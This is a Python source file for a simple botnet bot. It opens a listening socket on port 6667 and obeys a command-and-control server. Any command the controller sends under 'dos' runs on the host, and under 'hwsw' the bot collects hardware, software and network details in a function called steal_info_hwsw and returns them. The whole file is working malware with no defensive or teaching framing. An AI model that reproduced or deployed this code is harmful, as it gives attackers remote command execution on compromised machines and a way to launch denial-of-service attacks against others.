import socket
import subprocess
import json

CURRENT_PROCESSES = []


def get_my_ip():
    cmd = ['hostname', '-I']
    my_ip = exec_cmd(cmd)
    return my_ip[:-2]

def exec_cmd(cmd, wait=False):
    if wait:
        proc = subprocess.Popen(cmd, shell=False, stdin=None, stdout=None, stderr=None,close_fds=True)
        CURRENT_PROCESSES.append(proc)
        return 1
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    o, e = proc.communicate()
    result = o.decode('ascii')
    return result

def steal_info_hwsw():
    return {
        "uname": exec_cmd(["uname", "-a"]),
        "lscpu": exec_cmd(["lscpu"]),
        "network": exec_cmd(["netstat", "-i"])
    }

def handle_irc_connection(server_socket):
    conn, address = server_socket.accept()
    print("[+] Got connection from: " + str(address))

    while True:
        data = conn.recv(1024).decode()
        if not data or data == "kill" or data == 'exit':
            break
        data = str(data)
        print("from C&C: " + data)
        action_type, action = data.split(":")
        if action_type == "dos":
            print("[+] Executing dos as C&C asked")
            exec_cmd(action.split(), wait=True)
        elif action_type == "hwsw":
            print("[+] Extracting info on hw and sw info as C&C asked")
            infos = steal_info_hwsw()
            conn.send(json.dumps(infos, indent=2).encode('utf-8'))
    conn.close()  # close the connection

    if data == 'exit':
        return handle_irc_connection(server_socket)
    # else 
    print("[-] Killing bot")
    [proc.kill() for proc in CURRENT_PROCESSES]
    return 1

def set_up_irc():
    host = get_my_ip()
    port = 6667
    clients = 1

    server_socket = socket.socket()
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((host, port))
    print(f"-- irc listening ({host}, {port}) --")

    server_socket.listen(clients)

    handle_irc_connection(server_socket)
    return 1